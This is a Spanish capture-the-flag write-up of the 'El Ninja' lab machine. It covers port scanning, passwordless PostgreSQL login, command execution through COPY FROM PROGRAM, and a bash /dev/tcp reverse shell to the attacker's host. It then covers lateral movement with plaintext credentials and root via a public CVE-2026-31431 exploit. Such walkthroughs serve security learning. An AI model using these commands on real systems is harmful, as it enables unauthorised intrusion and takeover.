---
creator: nohh022
pubDatetime: 2026-05-16T01:00:00Z
title: El Ninja
slug: el-ninja
platform: The Hackers Labs
ogImage: ../../assets/images/thehackerslabs/el-ninja/el-ninja.jpg
featured: false
tags:
  - linux
  - postgres
  - cve
description:
  Write up de la máquina El Ninja de la plataforma The Hackers Labs
---

![logo](../../assets/images/thehackerslabs/el-ninja/el-ninja.jpg)

## Table of contents

## Enumeración

La máquina El Ninja tiene la ip **10.0.2.34**

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 10.0.2.34

Nmap scan report for 10.0.2.34
Host is up (0.00023s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http       nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  http       Uvicorn
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
5000/tcp open  http       Werkzeug httpd 3.1.8 (Python 3.11.2)
|_http-title: THL Ninjas \xE2\x80\x94 Precision. Silencio. Ejecucion....
|_http-server-header: Werkzeug/3.1.8 Python/3.11.2
5432/tcp open  postgresql PostgreSQL DB 15.15 - 15.16
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2024-10-16T11:07:27
|_Not valid after:  2034-10-14T11:07:27
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL: 
|     [+] Username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     [+] Username: [+] Password: 
|     Login Failed
|   Help: 
|     [+] Username: [+] Password:
|   RPCCheck: 
|     [+] Username: Traceback (most recent call last):
|     File "/home/wvverez/server.py", line 33, in <module>
|     handle()
|     File "/home/wvverez/server.py", line 13, in handle
|     user = sys.stdin.readline().strip()
|     ^^^^^^^^^^^^^^^^^^^^
|     File "<frozen codecs>", line 322, in decode
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     [+] Username: Traceback (most recent call last):
|     File "/home/wvverez/server.py", line 33, in <module>
|     handle()
|     File "/home/wvverez/server.py", line 13, in handle
|     user = sys.stdin.readline().strip()
|     ^^^^^^^^^^^^^^^^^^^^
|     File "<frozen codecs>", line 322, in decode
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     [+] Username: Traceback (most recent call last):
|     File "/home/wvverez/server.py", line 33, in <module>
|     handle()
|     File "/home/wvverez/server.py", line 13, in handle
|     user = sys.stdin.readline().strip()
|     ^^^^^^^^^^^^^^^^^^^^
|     File "<frozen codecs>", line 322, in decode
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
```

### Puerto 5432 (POSTGRESQL)

Vamos a tratar de conectarnos a **postgresql** con su usuario por defecto, **postgres**, sin proporcionar contraseña.

```bash
psql -h 10.0.2.34 -U postgres -w

psql (18.3 (Debian 18.3-1+b1), server 15.16 (Debian 15.16-0+deb12u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# \l
                                                             List of databases
        Name        |   Owner    | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |     Access privileges     
--------------------+------------+----------+-----------------+-------------+-------------+--------+-----------+---------------------------
 postgres           | postgres   | UTF8     | libc            | es_ES.UTF-8 | es_ES.UTF-8 |        |           | 
 template0          | postgres   | UTF8     | libc            | es_ES.UTF-8 | es_ES.UTF-8 |        |           | =c/postgres              +
                    |            |          |                 |             |             |        |           | postgres=CTc/postgres
 template1          | postgres   | UTF8     | libc            | es_ES.UTF-8 | es_ES.UTF-8 |        |           | =c/postgres              +
                    |            |          |                 |             |             |        |           | postgres=CTc/postgres
 thlninjas_internal | superadmin | UTF8     | libc            | es_ES.UTF-8 | es_ES.UTF-8 |        |           | =Tc/superadmin           +
                    |            |          |                 |             |             |        |           | superadmin=CTc/superadmin
(4 rows)

postgres=# \dt
Did not find any tables.
```

Conseguimos conectarnos y listar las bases de datos disponibles, además, listamos las tablas de la base de datos **postgres** pero no encontramos ninguna.

Si observamos las bases de datos, tenemos al usuario **superadmin** que es el propietario de **thlninjas_internal**, por lo tanto, probamos la misma técnica de antes, conectarnos como ese usuario sin proporcionar contraseña a su base de datos. 

```bash
psql -h 10.0.2.34 -U superadmin -d thlninjas_internal -w

psql (18.3 (Debian 18.3-1+b1), server 15.16 (Debian 15.16-0+deb12u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

thlninjas_internal=# \dt
Did not find any tables.
```

Conseguimos conectarnos y listar las tablas de **thlninjas_internal** pero tampoco hay contenido.

Por el nombre de este usuario deducimos que es un **superuser** por lo que podemos intentar ejecutar comandos.

```bash
thlninjas_internal=# CREATE TEMP TABLE result(result text);COPY result FROM PROGRAM 'id';SELECT * FROM result;
CREATE TABLE
COPY 1
                                 result                                 
------------------------------------------------------------------------
 uid=104(postgres) gid=112(postgres) grupos=112(postgres),109(ssl-cert)
(1 row)
```

Conseguimos ejecutar el comando **id**.

## Explotación

Hemos confirmado la posibilidad de ejecución de comandos, así que, vamos a mandarnos una reverse shell.

Nos ponemos en escucha con **netcat**

```bash
nc -nlvp 443
```

Y en postgresql ejecutamos 

```bash
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.X.X.X/443 0>&1"';
```

Recibimos la reverse shell y entramos como el usuario **postgres**

## Movimiento Lateral
### Wvverez

Si revisamos el directorio **/opt** encontramos un archivo **db.php**

```php
<?php
$db_credentials = [
    'username' => 'wvverez',
    'password' => 'dun1bd12dh979d178gd5%djnashda'
];
?>
```

Son las credenciales del usuario **wvverez**. Las utilizamos para convertirnos en él.

```bash
wvverez@TheHackersLabs-ElNinja:~$ whoami
wvverez
wvverez@TheHackersLabs-ElNinja:~$ ls -la
total 56
drwx------ 5 wvverez wvverez 4096 abr 28 18:51 .
drwxr-xr-x 3 root    root    4096 abr 28 17:19 ..
-rw-r--r-- 1 wvverez wvverez 1955 abr 28 14:34 api.py
-rw-r--r-- 1 wvverez wvverez 3065 abr 28 15:43 app.py
lrwxrwxrwx 1 root    root       9 abr 28 18:49 .bash_history -> /dev/null
-rw-r--r-- 1 wvverez wvverez  220 abr 28 12:23 .bash_logout
-rw-r--r-- 1 wvverez wvverez 3526 abr 28 12:23 .bashrc
-rwxr-xr-x 1 wvverez wvverez 1076 abr 28 16:15 config.py
-rwxr-xr-x 1 wvverez wvverez 1010 abr 28 15:58 db.json
drwxr-xr-x 3 wvverez wvverez 4096 abr 28 16:15 ninja_web
-rw-r--r-- 1 wvverez wvverez  807 abr 28 12:23 .profile
drwxr-xr-x 2 wvverez wvverez 4096 abr 28 16:15 __pycache__
-rwxr-xr-x 1 wvverez wvverez  882 abr 28 12:33 server.py
drwxr-xr-x 2 wvverez wvverez 4096 abr 28 16:32 templates
-rw-r--r-- 1 root    root      38 abr 28 18:51 user.txt
```

### Root

La versión del kernel de la máquina es la **6.1.0-26** con fecha noviembre de 2024, es decir, es vulnerable al **CVE-2026-31431** conocido como **Copy Fail**.

Empleamos este script de github y nos convertimos en **root**

- https://github.com/theori-io/copy-fail-CVE-2026-31431

```bash
wvverez@TheHackersLabs-ElNinja:~$ python3 ./copy_fail_exp.py 
# whoami
root
# bash
root@TheHackersLabs-ElNinja:/home/wvverez# ls -la /root
total 44
drwx------  6 root root 4096 Apr 29 17:46 .
drwxr-xr-x 18 root root 4096 Oct 16  2024 ..
-rw-------  1 root root   98 Apr 29 17:46 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Apr 28 12:44 .cache
-rw-------  1 root root   20 Apr 28 17:20 .lesshst
drwxr-xr-x  3 root root 4096 Oct 16  2024 .local
drwx------  3 root root 4096 Apr 28 12:29 .mongodb
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 May 16 15:50 .ssh
-rw-r--r--  1 root root   22 Apr 28 18:51 root.txt
```